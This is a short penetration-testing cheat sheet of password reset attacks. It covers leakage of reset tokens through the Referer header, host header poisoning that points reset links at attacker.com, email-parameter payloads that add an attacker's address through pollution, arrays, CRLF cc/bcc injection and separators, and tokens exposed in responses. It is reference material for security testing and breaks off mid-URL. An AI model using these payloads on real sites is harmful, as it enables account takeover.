# Password Reset Token Leak Via Referrer
1.Request password reset to your email address

2.Click on the password reset link

3.Don’t change password

4.Click any 3rd party websites(eg: Facebook, twitter)

5.Intercept the request in Burp Suite proxy

6.Check if the referer header is leaking password reset token.

# Password Reset Poisoning
1.Intercept the password reset request in Burp Suite

2.Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com

3.Forward the request with the modified header [http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com]

4.Look for a password reset URL based on the host header like : [https://attacker.com/reset-password.php?token=TOKEN]

# Password Reset Via Email Parameter

> parameter pollution
email=victim@mail.com&email=hacker@mail.com

> array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

> carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

> separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com


# Leaking Password Reset Token
1.Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com

2.Inspect the server response and check for resetToken

3.Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL
